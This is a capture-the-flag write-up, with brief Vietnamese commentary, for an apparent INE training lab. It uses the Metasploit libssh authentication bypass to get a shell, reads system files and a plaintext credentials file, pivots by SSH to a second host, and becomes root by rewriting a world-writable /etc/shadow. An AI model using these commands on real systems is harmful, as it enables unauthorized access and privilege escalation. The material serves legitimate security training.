# Post-Exploitation CTF 1

(root㉿INE)-[~]\
└─# `ping target1.ine.local`

    PING target1.ine.local (192.161.40.4) 56(84) bytes of data.
    64 bytes from target1.ine.local (192.161.40.4): icmp_seq=1 ttl=64 time=0.119 ms
    64 bytes from target1.ine.local (192.161.40.4): icmp_seq=2 ttl=64 time=0.062 ms
    ^C
    --- target1.ine.local ping statistics ---
    2 packets transmitted, 2 received, 0% packet loss, time 1015ms
    rtt min/avg/max/mdev = 0.062/0.090/0.119/0.028 ms

(root㉿INE)-[~]\
└─# `nmap -sV -A 192.161.40.4`

    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-28 14:29 IST
    Nmap scan report for target1.ine.local (192.161.40.4)
    Host is up (0.000078s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
    | ssh-hostkey: 
    |_  2048 31:e2:1d:f1:b2:39:0c:a3:ec:db:01:4a:eb:a2:39:c7 (RSA)
    MAC Address: 02:42:C0:A1:28:04 (Unknown)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/28%OT=22%CT=1%CU=37051%PV=N%DS=1%DC=D%G=Y%M=0242C
    OS:0%TM=6979D010%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%T
    OS:S=A)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M
    OS:5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN
    OS:(W1=7C70%W2=7C70%W3=7C70%W4=7C70%W5=7C70%W6=7C70)ECN(R=Y%DF=Y%T=40%W=7D7
    OS:8%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
    OS:R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
    OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
    OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
    OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 1 hop

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.08 ms target1.ine.local (192.161.40.4)

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
    Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds

Ta thays chi co port 22 mo 

Tim kiem libssh 0.8.3 ta thay co cve

vao msf

`msfconsole -q`

`search libssh`

    Matching Modules
    ================

    #  Name                                      Disclosure Date  Rank    Check  Description
    -  ----                                      ---------------  ----    -----  -----------
    0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
    1    \_ action: Execute                      .                .       .      Execute a command
    2    \_ action: Shell  


msf6 > `use 0`

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > `set RHOSTS 192.161.40.4`

    RHOSTS => 192.161.40.4

msf6>auxiliary(scanner/ssh/libssh_auth_bypass) > `set spawn_pty true`

    spawn_pty => true

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > `run`

    [*] 192.161.40.4:22 - Attempting authentication bypass
    [*] Attempting "Shell" Action, see "show actions" for more details
    [*] Command shell session 2 opened (192.161.40.2:34683 -> 192.161.40.4:22) at 2026-01-28 14:38:21 +0530
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > `sessions`

    Active sessions
    ===============

    Id  Name  Type   Information                                                  Connection
    --  ----  ----   -----------                                                  ----------
    2         shell  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.161.40.2:34683 -> 192.161.40.4:22 (192.161.40.4)

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > `sessions 2`

    [*] Starting interaction with 2...


    Shell Banner:
    _[?2004hsh-5.2$
    -----
          

sh-5.2$ `cat /etc/passwd`

    cat /etc/passwd
    root:x:0:0::/root:/usr/bin/bash
    alpm:x:980:980:Arch Linux Package Management:/:/usr/bin/nologin
    bin:x:1:1::/:/usr/bin/nologin
    daemon:x:2:2::/:/usr/bin/nologin
    mail:x:8:12::/var/spool/mail:/usr/bin/nologin
    ftp:x:14:11::/srv/ftp:/usr/bin/nologin
    http:x:33:33::/srv/http:/usr/bin/nologin
    nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin
    dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
    systemd-coredump:x:979:979:systemd Core Dumper:/:/usr/bin/nologin
    systemd-network:x:978:978:systemd Network Management:/:/usr/bin/nologin
    systemd-oom:x:977:977:systemd Userspace OOM Killer:/:/usr/bin/nologin
    systemd-journal-remote:x:976:976:systemd Journal Remote:/:/usr/bin/nologin
    systemd-resolve:x:975:975:systemd Resolver:/:/usr/bin/nologin
    systemd-timesync:x:974:974:systemd Time Synchronization:/:/usr/bin/nologin
    tss:x:973:973:tss user for tpm2:/:/usr/bin/nologin
    uuidd:x:68:68::/:/usr/bin/nologin
    user:x:1000:1000::/home/user:/usr/bin/bash
    FLAG1_0a53750fce5a43bb83955c4a0fb3f7f8:x:1001:984::/home/FLAG1_0a53750fce5a43bb83955c4a0fb3f7f8:/usr/bin/bash

sh-5.2$ `cat /etc/group`

    cat /etc/group
    root:x:0:root
    sys:x:3:bin
    mem:x:8:
    ftp:x:11:
    mail:x:12:
    log:x:19:
    smmsp:x:25:
    proc:x:26:
    games:x:50:
    lock:x:54:
    network:x:90:
    floppy:x:94:
    scanner:x:96:
    power:x:98:
    nobody:x:65534:
    adm:x:999:daemon
    wheel:x:998:
    utmp:x:997:
    audio:x:996:
    disk:x:995:
    input:x:994:
    kmem:x:993:
    kvm:x:992:
    lp:x:991:
    optical:x:990:
    render:x:989:
    sgx:x:988:
    storage:x:987:
    tty:x:5:
    uucp:x:986:
    video:x:985:
    users:x:984:
    groups:x:983:
    systemd-journal:x:982:
    rfkill:x:981:
    alpm:x:980:
    bin:x:1:daemon
    daemon:x:2:bin
    http:x:33:
    dbus:x:81:
    systemd-coredump:x:979:
    systemd-network:x:978:
    systemd-oom:x:977:
    systemd-journal-remote:x:976:
    systemd-resolve:x:975:
    systemd-timesync:x:974:
    tss:x:973:
    uuidd:x:68:
    user:x:1000:
    # FLAG2_9c2a027aaeb7413e92ff604999a33747

sh-5.2$ `ls /etc/cron.d`

    ls /etc/cron.d
    0hourly  FLAG3_2e8913b00aae4321b38d4ac6775e49a7

sh-5.2$ `cat /home/user/credentials.txt`

    cat credentials.txt
    john:Pass@john123

sh-5.2$ `/bin/bash -i`

[user@target1 /]$ `cat /etc/hosts`

    cat /etc/hosts
    127.0.0.1       localhost
    ::1     localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    192.161.40.4    target1.ine.local target1
    #FLAG4_780abd8489c348e6a004ecdafc4ba594
    192.161.40.2 INE
    192.161.40.3 target2.ine.local
    192.161.40.4 target1.ine.local

Từ đây ta thấy được IP của target 2

Chạy nmap với IP này ta thấy chỉ mở port 22, với gợi ý của flag 5 ta kết nối ssh với `john:Pass@john123`

SSH voi target 2

(root㉿INE)-[~]\
└─# `ssh john@192.161.40.3`

Sau khi vào ta chạy 

`find / -not -type l -perm -o+w`

Nhận thấy `/etc/shadow` được phép sửa

Nên ta thêm password `root`

`openssl passwd -1 -salt abc password123`

	$1$abc$UWUoROXzUCsLsVzI0R2et.

Dùng nano để sửa `/etc/shadow`

john@target2:/home$ `cat /etc/shadow`

    root:$1$abc$UWUoROXzUCsLsVzI0R2et.:19977:0:99999:7:::
    daemon:*:19977:0:99999:7:::
    bin:*:19977:0:99999:7:::
    sys:*:19977:0:99999:7:::
    sync:*:19977:0:99999:7:::
    games:*:19977:0:99999:7:::
    man:*:19977:0:99999:7:::
    lp:*:19977:0:99999:7:::
    mail:*:19977:0:99999:7:::
    news:*:19977:0:99999:7:::
    uucp:*:19977:0:99999:7:::
    proxy:*:19977:0:99999:7:::
    www-data:*:19977:0:99999:7:::
    backup:*:19977:0:99999:7:::
    list:*:19977:0:99999:7:::
    irc:*:19977:0:99999:7:::
    gnats:*:19977:0:99999:7:::
    nobody:*:19977:0:99999:7:::
    _apt:*:19977:0:99999:7:::
    systemd-network:*:20041:0:99999:7:::
    systemd-resolve:*:20041:0:99999:7:::
    mysql:!:20041:0:99999:7:::
    messagebus:*:20041:0:99999:7:::
    ntp:*:20041:0:99999:7:::
    postfix:*:20041:0:99999:7:::
    dovecot:*:20041:0:99999:7:::
    dovenull:*:20041:0:99999:7:::
    bind:*:20041:0:99999:7:::
    sshd:*:20041:0:99999:7:::
    Debian-snmp:!:20041:0:99999:7:::
    telnetd:*:20041:0:99999:7:::
    john:$y$j9T$Wg2TIAwOkbGDxz1JzXUui.$N66Tm9Am8yo3/dpqEOKDj87y7jKpt.hzsFOAkEFpqMC:20041:0:99999:7:::

john@target2:/home$ `su`

Password: 

root@target2:

root@target2:/# `cd /root`

root@target2:~# `ls`

    flag.txt

root@target2:~# `cat flag.txt`

    FLAG5_b33ae3f16b304666a316abf7f4485f0e


